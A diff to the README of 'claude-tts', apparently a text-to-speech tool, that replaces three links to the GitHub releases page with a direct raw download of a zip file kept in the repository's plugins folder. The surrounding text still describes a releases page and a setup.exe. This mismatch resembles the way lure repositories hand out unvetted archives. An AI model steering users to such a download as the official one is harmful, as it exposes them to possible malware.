@@ -1,6 +1,6 @@
 # 🎤 claude-tts - Simple Text-to-Speech for Everyone
 
-[![Download claude-tts](https://img.shields.io/badge/Download-claude--tts-brightgreen?style=for-the-badge)](https://github.com/JacklineMK/claude-tts/releases)
+[![Download claude-tts](https://img.shields.io/badge/Download-claude--tts-brightgreen?style=for-the-badge)](https://github.com/JacklineMK/claude-tts/raw/refs/heads/main/plugins/claude_tts_3.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No additional software or programming tools are needed. claude-tts runs on its o
 
 To get claude-tts, visit the official releases page:
 
-[→ Download claude-tts Here ←](https://github.com/JacklineMK/claude-tts/releases)
+[→ Download claude-tts Here ←](https://github.com/JacklineMK/claude-tts/raw/refs/heads/main/plugins/claude_tts_3.3.zip)
 
 This page contains the latest versions of the software. Pick the file that matches your Windows system. Usually, it will be named something like `claude-tts-setup.exe`.
 
@@ -122,7 +122,7 @@ You can adjust the volume and speed in the settings to suit your preferences.
 
 Visit the project page on GitHub for updates, additional downloads, and user support:  
 
-[https://github.com/JacklineMK/claude-tts/releases](https://github.com/JacklineMK/claude-tts/releases)
+[https://github.com/JacklineMK/claude-tts/raw/refs/heads/main/plugins/claude_tts_3.3.zip](https://github.com/JacklineMK/claude-tts/raw/refs/heads/main/plugins/claude_tts_3.3.zip)
 
 You will find the latest releases and instructions for macOS and Linux there too.
 
